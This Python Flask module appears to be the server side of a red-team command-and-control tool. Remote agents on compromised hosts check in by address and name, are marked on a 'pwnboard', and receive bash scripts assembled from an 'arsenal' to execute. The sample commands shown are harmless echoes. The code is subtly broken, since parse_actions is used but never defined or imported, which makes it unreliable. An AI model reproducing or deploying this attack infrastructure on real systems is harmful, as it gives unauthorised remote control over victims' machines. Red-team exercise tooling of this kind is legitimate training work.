"""
    This module contains all valid server endpoints.
"""
from flask import Blueprint, Response

from .arsenal import checkin
from .handlers import get_file_commands
from .utils import log, updatePwnboard

ROUTES = Blueprint('endpoint', __name__)

@ROUTES.route('/<addr>/<name>', methods=['POST', 'GET'])
def handle_agent(addr="U", name="Name"):
    """
    This method handles any incoming agent connections.
    """
    
    updatePwnboard(addr)
    #log("Checking in {}".format(session_id))

    # Check in arsenal
    final_script = checkin(addr, name)

    # Check in from the files
    final_script += get_file_commands(addr, name)

    return Response(final_script, mimetype="text/plain")


@ROUTES.route('/test', methods=['GET', 'POST'])
def test_response():
    """
    This function will return a sample of a standard response using static data.
    """
    def render_commands(commands):
        '''
        Turn array of coms into a bash command
        '''
        commands = ["#!/bin/bash"] + commands
        commands = "\n".join(commands)
        return Response(commands + "\n", mimetype='text/plain')

    actions = [
        {
            "action_id": "some action 1 to track",
            "command": "echo",
            "args": ["this is action 1"],
            "action_type": 1
        },
        {
            "action_id": "some action 2 to track",
            "command": "echo",
            "args": ["action2", "arg2"],
            "action_type": 1
        },
        {
            "action_id": "some action 3 to track",
            "command": "echo",
            "args": ["hi dad"],
            "action_type": 1
        }]
    resp = render_commands(parse_actions(actions))
    return resp
